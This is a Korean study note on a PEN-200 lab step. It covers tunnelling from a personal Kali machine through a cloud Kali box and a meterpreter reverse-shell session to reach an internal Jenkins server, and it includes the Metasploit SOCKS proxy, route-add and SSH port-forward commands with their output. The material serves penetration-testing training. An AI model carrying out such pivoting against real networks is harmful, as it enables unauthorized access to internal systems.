# 26.10.3 Jenkins 접속

> **Loading Jenkins** · PEN-200 §26.10.3

curl 로 요청을 하나씩 만들어 열거하는 것은 곧 한계에 부딪힘. 대상을 확보했으므로 개인 Kali → 클라우드 Kali → 리버스셸 → Jenkins 로 이어지는 터널을 세워 개인 인스턴스에서 직접 요청을 보내는 구성으로 전환함.

![[PEN200-Fig-349.png]]
*개인 Kali 에서 Jenkins 까지 이어지는 터널 구성*

구성 요소는 셋임 — 클라우드 Kali 의 SOCKS 프록시, Jenkins 가 있는 172.30.0.1/16 대역을 셸로 흘려보내는 라우트, 그리고 그 프록시 포트를 개인 Kali 로 끌어오는 SSH 터널.

먼저 meterpreter 의 상위 메뉴로 돌아가야 함. 셸을 `exit` 로 빠져나온 뒤 `background` 로 세션을 내림.

⚠️ `exit` 는 **활성 셸 안에 있을 때만** 칠 것. 셸이 아닌 상태에서 치면 Metasploit 자체가 종료됨.

```
exit
[-] core_channel_interact: Operation failed: Unknown error
meterpreter > background
[*] Backgrounding session 1...
```

SOCKS 프록시는 `auxiliary/server/socks_proxy` 모듈로 띄움. 기본 SRVHOST 는 모든 인터페이스라 프록시가 인터넷에 노출되므로 `127.0.0.1` 로 제한함. `-j` 로 백그라운드 잡으로 돌림.

```
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
```

프록시는 기본값으로 localhost:1080 에 뜸. 다음은 라우트 — `sessions` 로 세션 ID 를 확인하고, 대상 네트워크(Jenkins 서버 IP `172.30.0.1`)와 넷마스크(`255.255.0.0`), 세션 ID 를 `route add` 에 넘김.

```
msf6 exploit(server/socks_proxy) > sessions
Active sessions
===============
  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 ->
198.18.53.73:37604 (172.18.0.4)
msf6 auxiliary(server/socks_proxy) > route add 172.30.0.1 255.255.0.0 2
```

여기까지로 프록시와 라우트는 섰지만 프록시가 아직 클라우드 인스턴스 안에만 있음. 개인 Kali 에서 쓰려면 로컬 포워딩 SSH 터널이 필요함 — `-L` 로 개인 인스턴스에 열 인터페이스·포트와 전달 대상 포트를 지정하고, 명령 실행 없이 터널만 열도록 `-N`, 백그라운드 실행에 `-f` 를 붙임.

```
kali@kali:~$ ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
kali@192.88.99.76's password:
kali@kali:~$ ss -tulpn
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process
tcp    LISTEN  0       128          127.0.0.1:1080        0.0.0.0:*
users:(("ssh",pid=75991,fd=5))
tcp    LISTEN  0       128              [::1]:1080           [::]:*
users:(("ssh",pid=75991,fd=4))
```

Firefox 는 Settings > Network Settings 에서 **Manual proxy configuration** 을 선택하고 SOCKS Host `127.0.0.1`, Port `1080`, 버전은 **v5** 로 지정함. 이 트래픽이 SSH 터널 → Metasploit SOCKS 프록시 → 라우트 → Jenkins 순으로 흐름.

`http://172.30.0.30:8080` 으로 접속하면 터널을 여러 겹 지나느라 느리지만 페이지가 뜸. 화면에서 계정 생성(create an account) 링크를 확인함.
